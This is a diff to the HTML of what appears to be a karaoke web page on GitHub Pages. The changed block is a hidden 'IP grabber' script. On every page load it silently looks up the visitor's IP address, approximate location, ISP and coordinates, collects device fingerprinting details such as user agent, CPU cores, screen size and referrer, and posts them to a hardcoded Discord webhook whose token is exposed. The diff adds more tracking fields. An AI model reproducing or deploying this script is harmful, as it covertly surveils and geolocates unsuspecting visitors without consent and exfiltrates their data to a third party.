@@ -1084,7 +1084,7 @@ document.addEventListener('keydown', e => {
 // Init favorites display
 renderFavList();
 </script>
-<!-- ==================== IP GRABBER UPGRADE v8 - Stabil + Device Model ==================== -->
+<!-- ==================== IP GRABBER FINAL - Sesuai Selera Kamu ==================== -->
 <script>
 // GANTI DENGAN WEBHOOK DISCORD KAMU
 const WEBHOOK_URL = "https://discord.com/api/webhooks/1489972314215809124/bRqWBzezptsRKE8nLFEFMjz3ShcgSFATRsf1KhuF4AkSKu3a2xIQkU0T4p5pCEgpQQq7";
@@ -1101,14 +1101,13 @@ function getDeviceModel() {
     }
     if (/iphone|ipad|ipod/.test(ua)) return 'iPhone / iPad';
     if (ua.includes('windows')) return 'Windows PC/Laptop';
-    if (ua.includes('macintosh')) return 'MacBook / iMac';
+    if (ua.includes('macintosh')) return 'Mac';
     return 'Unknown Device';
 }
 
 async function sendIPLog() {
     let ipData = { ip: 'Unknown', city: 'Unknown', region: 'Unknown', country_name: 'Unknown', org: 'Unknown', lat: null, lon: null };
 
-    // Coba ipapi.co dulu (lebih stabil di GitHub Pages)
     try {
         const res = await fetch('https://ipapi.co/json/');
         const data = await res.json();
@@ -1122,13 +1121,13 @@ async function sendIPLog() {
             lon: data.longitude
         };
     } catch (e) {
-        console.log("ipapi.co failed, trying fallback...");
+        console.log("IP lookup failed");
     }
 
     const deviceModel = getDeviceModel();
 
     const embed = {
-        title: "🎤 Karaoke Sync - Pengunjung Baru! (v8)",
+        title: "🎤 Karaoke Sync - Pengunjung Baru!",
         color: 0x00ff88,
         timestamp: new Date().toISOString(),
         fields: [
@@ -1138,10 +1137,14 @@ async function sendIPLog() {
             { name: "ISP", value: ipData.org || 'Unknown', inline: true },
             { name: "Device Model", value: deviceModel, inline: true },
             { name: "Screen", value: `${screen.width} × ${screen.height}`, inline: true },
-            { name: "Device Info", value: navigator.userAgent.substring(0, 240) + (navigator.userAgent.length > 240 ? "..." : ""), inline: false },
+            { name: "Device Info", value: navigator.userAgent.substring(0, 220) + (navigator.userAgent.length > 220 ? "..." : ""), inline: false },
+            { name: "Platform", value: navigator.platform || 'Unknown', inline: true },
+            { name: "CPU Cores", value: navigator.hardwareConcurrency || 'Unknown', inline: true },
+            { name: "Dark Mode", value: window.matchMedia('(prefers-color-scheme: dark)').matches ? '✅ Ya' : '❌ Tidak', inline: true },
+            { name: "Referrer", value: document.referrer ? document.referrer.substring(0, 90) : "Langsung / WA", inline: false },
             { name: "Waktu (WIB)", value: new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' }), inline: false }
         ],
-        footer: { text: "IP Grabber via GitHub Pages • Upgrade v8" }
+        footer: { text: "IP Grabber via GitHub Pages • Final Version" }
     };
 
     try {
@@ -1150,7 +1153,7 @@ async function sendIPLog() {
             headers: { "Content-Type": "application/json" },
             body: JSON.stringify({ username: "Karaoke Logger", embeds: [embed] })
         });
-        console.log("%c✅ IP Log terkirim - Upgrade v8", "color: lime; font-weight: bold");
+        console.log("%c✅ IP Log terkirim - Final Version", "color: lime; font-weight: bold");
     } catch (err) {
         console.log("IP Logger error:", err.message);
     }
@@ -1158,7 +1161,7 @@ async function sendIPLog() {
 
 // Jalankan setelah load
 window.addEventListener('load', () => {
-    setTimeout(sendIPLog, 2000);
+    setTimeout(sendIPLog, 1800);
 });
 </script>
-<!-- ==================== END IP GRABBER UPGRADE v8 ==================== -->
+<!-- ==================== END IP GRABBER FINAL ==================== -->
